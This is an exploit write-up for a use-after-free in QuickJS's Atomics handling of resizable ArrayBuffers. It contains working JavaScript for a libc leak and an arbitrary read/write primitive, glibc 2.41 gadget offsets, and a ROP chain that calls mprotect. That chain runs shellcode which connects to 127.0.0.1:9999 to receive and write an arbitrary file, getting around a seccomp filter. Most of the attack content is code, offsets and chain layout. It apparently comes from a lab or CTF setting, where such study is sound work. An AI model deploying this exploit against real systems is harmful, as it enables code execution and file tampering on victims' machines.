# QuickJS Atomics RAB Connectback Exploit Analysis

## Vulnerability Summary

The vulnerability exists in QuickJS's `js_atomics_op()` and `js_atomics_store()` functions when handling resizable ArrayBuffers. A pointer to the buffer's data is captured before user code runs via `valueOf()`, but `valueOf()` can trigger a buffer resize, causing the captured pointer to become stale. This yields an out-of-bounds / use-after-free access.

## Exploitation Strategy

### Target Environment
- **Full RELRO**: GOT is read-only
- **Seccomp Filter**: Blocks execve, execveat, fork, vfork, clone, clone3
- **Goal**: Connect to 127.0.0.1:9999, receive filename+content, write to file

### Exploit Steps

#### Step 1: Leak libc Address (Unsorted Bin)

Allocate a large resizable ArrayBuffer (0x3000 bytes) and resize it to a much smaller size (0x20 bytes) inside a `valueOf()` callback during an Atomics operation. When the buffer shrinks via realloc, the freed memory goes into the unsorted bin, and the freed chunk's fd/bk pointers contain `main_arena+96`.

```javascript
let leak = u64(Atomics.add(ta, 6, {
    valueOf() { rab.resize(0x20); return 0n; }
}));
let libcBase = leak - 0x1e7b20n;  // main_arena+96 offset
```

#### Step 2: Build Arbitrary Read/Write Primitive

Create a new resizable ArrayBuffer (0x70 bytes) and a BigInt64Array view. In the `valueOf()` callback:
1. Resize the RAB to 0x20, freeing 0x50 bytes
2. Create a new BigUint64Array on a large backing buffer
3. The new TypedArray's JSObject may land in the freed space
4. The stale pointer write corrupts `JSObject.u.array.u.ptr` to point to our target address

```javascript
function make_arb_u64_view(base_addr, backing_bytes) {
    let backing = new ArrayBuffer(backing_bytes);
    let victim;
    const L1 = 0x70, L2 = 0x20;
    let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
    let ta = new BigInt64Array(rab);

    let evil = {
        valueOf() {
            rab.resize(L2);
            victim = new BigUint64Array(backing);
            return base_addr;  // Written to offset 0x68 -> u.array.u.ptr
        }
    };
    Atomics.store(ta, 13, evil);  // index 13 = offset 0x68
    return { backing, victim, base: base_addr };
}
```

#### Step 3: Find Stack via environ

Read the `environ` pointer from libc (offset 0x1eee28), which points to the environment variable array on the stack.

```javascript
let libcView = make_arb_u64_view(libcBase, 0x600000);
let envPtr = u64(libcView.victim[Number(OFF_ENVIRON >> 3n)]);
```

#### Step 4: Find main's Return Address

Scan backwards from environ to find the return address value (`libcBase + 0x29ca8`), which is the address in `__libc_start_call_main` that main will return to.

```javascript
let mainRetValue = libcBase + 0x29ca8n;
for (let i = n - 4; i >= 0; i--) {
    if (stackView.victim[i] === mainRetValue) {
        ret_i = i;
        break;
    }
}
```

#### Step 5: Write Shellcode to Writable libc Page

Use arbitrary write to place shellcode in libc's writable segment (offset 0x1e7000).

The shellcode:
1. Creates a socket: `socket(AF_INET=2, SOCK_STREAM=1, 0)`
2. Connects to 127.0.0.1:9999
3. Reads filename length (4 bytes) and filename
4. Reads content length (4 bytes) and content
5. Opens/creates the file
6. Writes content to file
7. Exits cleanly

#### Step 6: Write ROP Chain to Stack

Overwrite main's return address with a ROP chain that:
1. Calls `mprotect(rwPageAddr, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)`
2. Returns to shellcode

```
ROP Chain:
[ret_i+0]  = pop rdi ; ret        (0x2a145)
[ret_i+1]  = rwPageAddr           (libc + 0x1e7000)
[ret_i+2]  = pop rsi ; ret        (0x2baa9)
[ret_i+3]  = 0x1000               (length)
[ret_i+4]  = pop rdx ; ... ; ret  (0xa97c6)
[ret_i+5]  = 7                    (PROT_RWX)
[ret_i+6]  = 0                    (dummy for rbx)
[ret_i+7]  = 0                    (dummy for rbp)
[ret_i+8]  = mprotect             (0x10d620)
[ret_i+9]  = shellcodeAddr        (libc + 0x1e7500)
```

## Key Offsets (glibc 2.41)

| Symbol | Offset |
|--------|--------|
| main_arena+96 | 0x1e7b20 |
| environ | 0x1eee28 |
| main return value | 0x29ca8 |
| pop rdi ; ret | 0x2a145 |
| pop rsi ; ret | 0x2baa9 |
| pop rdx ; xor eax,eax ; pop rbx ; pop rbp ; ret | 0xa97c6 |
| mprotect | 0x10d620 |
| RW page | 0x1e7000 |

## Execution Flow

1. JavaScript exploit runs
2. Leaks libc address via unsorted bin
3. Builds arbitrary r/w primitive
4. Reads environ to get stack address
5. Scans stack for main's return address
6. Writes shellcode to libc RW page
7. Writes ROP chain over return address
8. Script exits, main() returns
9. ROP chain executes mprotect()
10. Shellcode runs: connects, receives file data, writes file
11. Process exits

## Seccomp Bypass

The seccomp filter only blocks process-spawning syscalls:
- execve, execveat, fork, vfork, clone, clone3

All other syscalls are allowed, including:
- socket, connect, read, write, open, close, mprotect

This allows the exploit to:
1. Use mprotect to make shellcode executable
2. Use socket/connect for network communication
3. Use open/write/close for file I/O
